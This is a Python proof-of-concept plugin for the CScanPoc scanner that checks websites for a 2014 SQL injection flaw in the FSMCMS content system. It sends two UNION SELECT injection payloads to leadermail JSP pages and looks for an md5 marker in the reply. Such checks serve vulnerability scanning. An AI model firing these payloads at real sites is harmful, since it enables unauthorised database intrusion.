# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FSMCMS_0001'  # 平台漏洞编号，留空
    name = 'FSMCMS 通用SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-06-16'  # 漏洞公布时间
    desc = '''
        北京东方文辉FSMCMS /cms/leadermail/p_replydetail.jsp, /cms/leadermail/p_leadermailsum.jsp 页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FSMCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ef842fc2-0cf5-4189-8a54-ec9c99dcecfc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                '/cms/leadermail/p_replydetail.jsp?MailId=-1%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cmd5%280x22%29%2cNULL--%20', '/cms/leadermail/p_leadermailsum.jsp?dealpart=-1%27%20UNION%20ALL%20SELECT%20NULL%2cmd5%280x22%29--%20&year=2011']
            for payload in payloads:
                url = self.target + payload
                r = requests.get(url)
                if 'b15835f133ff2e27c7cb28117bfae8f4' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
